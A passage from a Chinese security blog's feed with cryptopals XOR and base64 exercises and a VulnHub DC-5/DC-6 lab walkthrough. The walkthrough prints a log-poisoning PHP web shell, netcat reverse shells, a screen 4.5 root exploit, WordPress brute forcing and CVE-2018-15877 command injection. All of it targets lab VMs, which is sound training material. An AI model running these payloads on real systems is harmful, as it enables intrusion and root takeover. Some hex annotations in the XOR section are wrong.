class="line">---ASCII/hex中直接到二进制---</span><br><span class="line">E = 69d = 0x45 = 01000101</span><br><span class="line">V = 86d = 0x56 = 01010110</span><br><span class="line">A = 65d = 0x41 = 01000001</span><br><span class="line">L = 76d = 0x4c = 01001100</span><br><span class="line">A = 65d = 0x41 = 01000001</span><br><span class="line">N = 78d = 0x4e = 01001110</span><br></pre></td></tr></table></figure></li><li><p><strong>2</strong> - XOR操作逻辑表如下：<br><img src="https://i.loli.net/2019/06/12/5d00f6ef7a5a066332.png" alt="2.png"><br>总结XOR（异或）一种逻辑运算，仅当输入不同时才输出ture</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---对两对字符串进行异或处理---</span><br><span class="line">01000101 01010110 01000001   XOR&apos;d against</span><br><span class="line">01001100 01000001 01001110</span><br><span class="line">---结果---</span><br><span class="line">00001001 00010111 00001111</span><br><span class="line">---转换回ascii对应纯文本结果---</span><br><span class="line">00001001 = 0x09 = HT(水平定位符号)</span><br><span class="line">00010111 = 0x23 = ETB(区块传输结束)</span><br><span class="line">00001111 = 0x15 = SI(启用变换（Shift in）)</span><br></pre></td></tr></table></figure></li><li><p><strong>3</strong> - —测试—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ord(b&apos;E&apos;) ^ ord(b&apos;L&apos;)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; chr(ord(b&apos;E&apos;) ^ ord(b&apos;L&apos;)).encode()</span><br><span class="line">b&apos;\t&apos;</span><br></pre></td></tr></table></figure></li></ul><p>代码实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def XOR_byte_date(byte_1,byte_2):</span><br><span class="line">    XOR_bytes = b&apos;&apos;</span><br><span class="line"></span><br><span class="line">    for b1,b2 in zip(byte_1,byte_2):</span><br><span class="line">        XOR_bytes += (bytes([b1 ^ b2]))</span><br><span class="line">    return XOR_bytes</span><br><span class="line">def main():</span><br><span class="line">    byte_table_1 = bytes.fromhex(&apos;1c0111001f010100061a024b53535009181c&apos;)</span><br><span class="line">    byte_table_2 = bytes.fromhex(&apos;686974207468652062756c6c277320657965&apos;)</span><br><span class="line">    print(binascii.hexlify(XOR_byte_date(byte_table_1,byte_table_2)).decode())</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/15/5d03e14d582bb11884.png" alt="3.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;The-cryptopals-crypto-challenges&quot;&gt;&lt;a href=&quot;#The-cryptopals-crypto-challenges&quot; class=&quot;headerlink&quot; title=&quot;The cryptopals crypto challenges&quot;&gt;&lt;/a&gt;The cryptopals crypto challenges&lt;/h1&gt;&lt;p&gt;可以使用大多数主流语言，解决问题&lt;br&gt;环境：Python3.7.0&lt;br&gt;项目地址：&lt;a href=&quot;http://cryptopals.com/sets/1/challenges/2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://cryptopals.com/sets/1/challenges/2&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://www.lanbainan.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="密码学" scheme="http://www.lanbainan.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>将Hex转换为base64</title>
    <link href="http://www.lanbainan.cn/2019/06/04/2019-06-04/"/>
    <id>http://www.lanbainan.cn/2019/06/04/2019-06-04/</id>
    <published>2019-06-04T14:49:00.000Z</published>
    <updated>2019-06-15T13:36:56.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-cryptopals-crypto-challenges"><a href="#The-cryptopals-crypto-challenges" class="headerlink" title="The cryptopals crypto challenges"></a>The cryptopals crypto challenges</h1><p><strong>这是一个密码挑战</strong><br>可以使用大多数主流语言，解决问题<br>环境：Python3.7.0<br>项目地址：<a href="http://cryptopals.com/sets/1/challenges/1" target="_blank" rel="noopener">http://cryptopals.com/sets/1/challenges/1</a><br><a id="more"></a> </p><h2 id="Convert-hex-to-base64"><a href="#Convert-hex-to-base64" class="headerlink" title="Convert hex to base64"></a>Convert hex to base64</h2><p>将 hex（16进制）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d</span><br></pre></td></tr></table></figure></p><p>打印为base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</span><br></pre></td></tr></table></figure></p><p>base64和hex是一种编码手段，易还原<br>Base64本质上是一个ASCII字符表，其对应值64(0-63)个值<br><img src="https://i.loli.net/2019/06/05/5cf77eaf672d323367.png" alt="1.png"><br>每个base64数字恰好代表6 bits。因此，三个8 bits（即24位）可以由四个6 bits的base64表示。<br>列如：设定ASCII字符串<code>EVA</code>,将对其进行base64编码</p><ul><li><strong>1</strong> - 将字符串–&gt;十六进制<pre><code>---ASCII/hex---E = 69d = 0x45V = 86d = 0x56A = 65d = 0x41</code></pre></li><li><strong>2</strong> - 十六进制–&gt;二进制<pre><code>0x45 = 0100 01010x56 = 0101 01100x41 = 0100 0001</code></pre></li><li><strong>3</strong> - 将二进制字符串<code>01000101 01010110 01000001</code>总数除以6，得到4个对应base64字符的值<pre><code>010001 010101 011001 000001010001 = 17d = R010101 = 21d = V011001 = 25d = Z000001 = 1d = B</code></pre></li></ul><p>验证方案：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a = base64.b64encode(&apos;EVA&apos;.encode(&apos;utf-8&apos;))</span><br><span class="line">print(str(a, &apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; RVZB</span><br></pre></td></tr></table></figure></p><p>当不能被6整除时，在编码末尾加入一个或两个<code>=</code>(<code>=</code>代表<code>000000</code>)</p><h2 id="代码实现1"><a href="#代码实现1" class="headerlink" title="代码实现1"></a>代码实现1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">string = &quot;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&quot;</span><br><span class="line">raw = binascii.unhexlify(string)</span><br><span class="line">bin_raw = base64.b64encode(raw).decode()</span><br><span class="line">print(bin_raw)</span><br></pre></td></tr></table></figure><h2 id="代码实现2"><a href="#代码实现2" class="headerlink" title="代码实现2"></a>代码实现2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=UTF-8 -*-</span><br><span class="line">b64_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def b64_encode(input_bytes):</span><br><span class="line">    # base64编码实现</span><br><span class="line">    </span><br><span class="line">    # 初始化变量</span><br><span class="line">    encoding_output = &apos;&apos;</span><br><span class="line"># 将输入字符转换为二进制，并创建1和0的列表</span><br><span class="line">    bit_list = list(&apos;&apos;.join([bin(byte)[2:].zfill(8) for byte in input_bytes]))</span><br><span class="line"></span><br><span class="line"># 将bit_list列表划分为6 bits一组</span><br><span class="line">    chunks = [bit_list[i:i + 6] for i in range(0, len(bit_list), 6)]</span><br><span class="line"></span><br><span class="line">    for chunk in chunks:</span><br><span class="line">        # 将chunks转化为010010这类</span><br><span class="line">        chunk = &apos;&apos;.join(chunk)</span><br><span class="line"></span><br><span class="line">        #检查chunk长度，根据需要在末尾添加&apos;=&apos;字符</span><br><span class="line">        if len(chunk) == 2:</span><br><span class="line">            if &apos;1&apos; in chunk:</span><br><span class="line">                chunk += &apos;0000&apos;</span><br><span class="line">                encoding_output += b64_table[int(chunk, 2)] + &apos;==&apos;</span><br><span class="line">            else:</span><br><span class="line">                encoding_output += &apos;==&apos;</span><br><span class="line">        elif len(chunk) == 4:</span><br><span class="line">            if &apos;1&apos; in chunk:</span><br><span class="line">                chunk += &apos;00&apos;</span><br><span class="line">                encoding_output += b64_table[int(chunk, 2)] + &apos;=&apos;</span><br><span class="line">            else:</span><br><span class="line">                encoding_output += &apos;=&apos;</span><br><span class="line">        elif len(chunk) == 6:</span><br><span class="line">            encoding_output += b64_table[int(chunk, 2)]</span><br><span class="line">    return encoding_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    string = &apos;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&apos;</span><br><span class="line">    byte_string = bytes.fromhex(string)</span><br><span class="line">    print(b64_encode(byte_string))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;The-cryptopals-crypto-challenges&quot;&gt;&lt;a href=&quot;#The-cryptopals-crypto-challenges&quot; class=&quot;headerlink&quot; title=&quot;The cryptopals crypto challenges&quot;&gt;&lt;/a&gt;The cryptopals crypto challenges&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这是一个密码挑战&lt;/strong&gt;&lt;br&gt;可以使用大多数主流语言，解决问题&lt;br&gt;环境：Python3.7.0&lt;br&gt;项目地址：&lt;a href=&quot;http://cryptopals.com/sets/1/challenges/1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://cryptopals.com/sets/1/challenges/1&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://www.lanbainan.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="密码学" scheme="http://www.lanbainan.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>对于DC-5和DC-6的测试</title>
    <link href="http://www.lanbainan.cn/2019/05/30/2019-05-30/"/>
    <id>http://www.lanbainan.cn/2019/05/30/2019-05-30/</id>
    <published>2019-05-30T04:06:00.000Z</published>
    <updated>2019-06-03T16:53:10.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><p>主机NET模式<br>实验目的：找到flag（提示随着页面刷新而改变的东西，没有涉及phpmailer漏洞）<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-5,314/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-5,314/</a><br><a id="more"></a> </p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf08598d49c513590.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p1-65535 192.168.67.146</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          33746/udp  status</span><br><span class="line">|_  100024  1          48648/tcp  status</span><br><span class="line">48648/tcp open  status  1 (RPC #100024)</span><br></pre></td></tr></table></figure></p><h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>进入页面没看见什么东东<br><img src="https://i.loli.net/2019/05/31/5cf08a392befa98955.png" alt="2.png"><br>爆破没有出货，在一顿瞎搞后发现<code>contact</code>页面在提交留言后，出现改变<br><img src="https://i.loli.net/2019/05/31/5cf08b3bb6eab49513.png" alt="3.png"><br>刷新一次改变一次，与提示相符</p><h3 id="Wfuzz"><a href="#Wfuzz" class="headerlink" title="Wfuzz"></a><a href="https://blog.csdn.net/hardhard123/article/details/79596104" target="_blank" rel="noopener">Wfuzz</a></h3><p>使用<code>wfuzz</code>测试页面参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://192.1 68.67.146/thankyou.php?FUZZ=FUZ2Z &gt; test.txt</span><br></pre></td></tr></table></figure></p><p>排序发现<code>file</code>参数<br><img src="https://i.loli.net/2019/05/31/5cf0add89545c86282.png" alt="4.png"></p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.146//thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf0af2c39a6639708.png" alt="5.png"><br>中间件使用的是<code>Nginx</code>,查看日志文件（操作日志<code>access.log</code>或者错误日志<code>error.log</code>）将WebShell写入<code>access.log</code>或者<code>error.log</code>日志，这里写入的是<code>access.log</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&apos;cmd&apos;]) ?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">λ nc 192.168.67.146 80</span><br><span class="line">&lt;?php system($_GET[&apos;cmd&apos;]) ?&gt;</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Thu, 30 May 2019 14:16:19 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 172</span><br><span class="line">Connection: close</span><br><span class="line">                                           </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.6.2&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf0eeba6004377570.png" alt="6.png"><br><strong>反弹shell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.146//thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc 192.168.67.1 4444 -e /bin/bash</span><br><span class="line">λ nc -nlvp 4444</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@dc-5:~/html$</span><br></pre></td></tr></table></figure></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>下载提权脚本<code>LinEnum</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/LinEnum# python -m SimpleHTTPServer 80 #简易HTTP服务器</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.67.128/LinEnum.sh</span><br><span class="line">www-data@dc-5:/tmp$ chmod u+x LinEnum.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./LinEnum</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/31/5cf0f5dd1472c75390.png" alt="7.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit screen 4.5</span><br><span class="line">root@kali:~# nc -nlvp 5555 &lt; /usr/share/exploitdb/exploits/linux/local/41154.sh -q 1</span><br><span class="line">www-data@dc-5:/tmp$ nc 192.168.67.128 5555 &gt; test.sh</span><br><span class="line">www-data@dc-5:/tmp$ chmod u+x test.sh</span><br></pre></td></tr></table></figure></p><p>这个PoC似乎不能运行<br>将其拆分为两个文件<br><code>libhax.c</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>rootshell.c</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali:~# gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</span><br><span class="line">root@kali:~# gcc -o ./rootshell ./rootshell.c</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.67.128/libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.67.128/rootshell</span><br></pre></td></tr></table></figure></p><p>照着脚本接着做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/etc$ cd /etc</span><br><span class="line">www-data@dc-5:/etc$ umask 000</span><br><span class="line">www-data@dc-5:/etc$ screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;</span><br><span class="line">www-data@dc-5:/etc$ screen -ls</span><br><span class="line">www-data@dc-5:/etc$ /tmp/rootshell</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@dc-5:/root# cat thisistheflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf106957effb26569.png" alt="8.png"></p><h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>主机NET模式<br>实验目的：找到flag（cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt）<br>项目地址：主机NET模式<br>实验目的：找到flag<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-6,315/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-6,315/</a></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/06/03/5cf4f30f96d3512372.png" alt="9.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali:~# nmap -T4 -A -v -p1-65535 192.168.67.147</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br></pre></td></tr></table></figure></p><p>至此无法打开网页<code>Did not follow redirect to http://wordy/</code><br>将其加入<code>hosts</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.67.147 wordy</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf503f9afb1743398.png" alt="10.png"><br>可以看出使用<code>WordPress</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wpscan --url http://wordy -e</span><br><span class="line">Users:admin、sarah、mark、jens、graham</span><br></pre></td></tr></table></figure></p><p>根据提示创建字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure></p><p>爆破密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# wpscan --url http://wordy -U user -P passwords.txt</span><br><span class="line">Username：mark</span><br><span class="line">Password：helpdesk01</span><br></pre></td></tr></table></figure></p><p>登录，发现可以安装插件<br><img src="https://i.loli.net/2019/06/03/5cf530eb5664491821.png" alt="11.png"></p><h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>利用<a href="https://github.com/aas-n/CVE/tree/master/CVE-2018-15877" target="_blank" rel="noopener">CVE-2018-15877</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf53cb3b3f7419327.png" alt="12.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 4444</span><br><span class="line">lanbainan.cn | nc 192.168.67.1 4444 -e /bin/bash</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$</span><br></pre></td></tr></table></figure></p><h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/var/www/html/wp-admin$ cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br><span class="line">cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">graham:x:1001:1001:Graham,,,:/home/graham:/bin/bash</span><br><span class="line">mark:x:1002:1002:Mark,,,:/home/mark:/bin/bash</span><br><span class="line">sarah:x:1003:1003:Sarah,,,:/home/sarah:/bin/bash</span><br><span class="line">jens:x:1004:1004:Jens,,,:/home/jens:/bin/bash</span><br></pre></td></tr></table></figure><p>继续在<code>home</code>目录下寻找线索<br>发现一个备份脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/home/jens$ cat backups.sh</span><br><span class="line">cat backups.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/04/5cf54555606a875921.png" alt="15.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf540677e0b033935.png" alt="13.png"><br>发现新用户<code>graham：GSo7isUM1D4</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 